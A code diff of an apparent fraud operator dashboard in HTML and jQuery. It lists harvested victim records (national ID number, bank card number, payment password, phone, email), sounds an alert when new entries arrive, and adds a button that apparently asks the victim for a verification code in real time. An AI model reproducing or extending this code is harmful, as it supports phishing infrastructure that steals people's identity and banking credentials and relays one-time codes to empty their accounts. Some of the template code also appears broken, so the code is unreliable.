@@ -4,25 +4,46 @@
             <th>ID</th>
             <th>终端类型</th>
             <th>邮箱</th>
-            <th>电话号码</th>
-            <th>真实姓名</th>
+            <th>姓名</th>
             <th>身份证号</th>
+            <th>手机</th>
             <th>银行卡号</th>
             <th>支付密码</th>
             <th>操作</th>
         </tr>
     </thead>
     <tbody>
+
     </tbody>
     <tfoot>
     </tfoot>
 </table>
+
 <div id="noticeItems" style="height: 300px; overflow-y: auto;">
 </div>
+
 <audio id="audioNotice" src="http://www.w3school.com.cn/i/song.mp3" controls="controls" style="display:none;">
 
 </audio>
 
+<script id="tr" type="text/x-jquery-tmpl">
+<tr data-id="{$id}">
+    <th>${id}</th>
+    <th>${deviceid}</th>
+    <th>${email}</th>
+    <th>${realname}</th>
+    <th>${idcode}</th>
+    <th>${linkphone}</th>
+    <th>${bankcard}</th>
+    <th>{paypwd}</th>
+    <th>
+        <a class="btn btn-primary" role="btnNotice">通过验证</a>
+        <a class="btn btn-primary" role="btnCaptcha">输入验证码</a>
+    </th>
+</tr>
+</script>
+
+<script type="text/javascript" src="/assets/third-party/jquery.tmpl.min.js"></script>
 <script type="text/javascript">
     Date.prototype.Format = function (fmt) { //author: meizz
         var o = {
@@ -56,6 +77,18 @@
                     a.parents('tr').remove();
                 }, 'json');
         });
+
+        $('tbody').delegate('a[role=btnCaptcha]', 'click', function(){
+            var a = $(this);
+            $.post('/admin/api/notice_client/' + a.parents('tr').attr('data-id') + '.json',
+                function (data) {
+                    if(data.status == 'err'){
+                        return;
+                    }
+
+                    a.parents('tr').remove();
+                }, 'json');
+        });
     });
     
     function refresh() {
@@ -75,19 +108,7 @@
                         continue;
                     }
                     var json = JSON.parse(items[key].otherData);
-                    $('tbody').append('<tr  data-id=' + items[key].id + '>' +
-                        '<td>' + items[key].id + '</td>' +
-                        '<td>' + (json.hasOwnProperty("deviceid") ? json.deviceid : "") + '</td>' +
-                        '<td>' + (json.hasOwnProperty("email") ? json.email : "") + '</td>' +
-                        '<td>' + (json.hasOwnProperty("linkphone") ? json.linkphone : "") + '</td>' +
-                        '<td>' + (json.hasOwnProperty("realname") ? json.realname : "") + '</td>' +
-                        '<td>' + (json.hasOwnProperty("idcode") ? json.idcode : "") + '</td>' +
-                        '<td>' + (json.hasOwnProperty("bankcard") ? json.bankcard : "") + '</td>' +
-                        '<td>' + (json.hasOwnProperty("paypwd") ? json.paypwd : "") + '</td>' +
-                        '<td>' +
-                        '<a class="btn btn-primary" role="btnNotice">通知前端</a>' +
-                        '</td>' +
-                        '</tr>');
+                    $('tbody').append(tr, items[key], null);
                     _max_id = items[key].id;
                 }
 
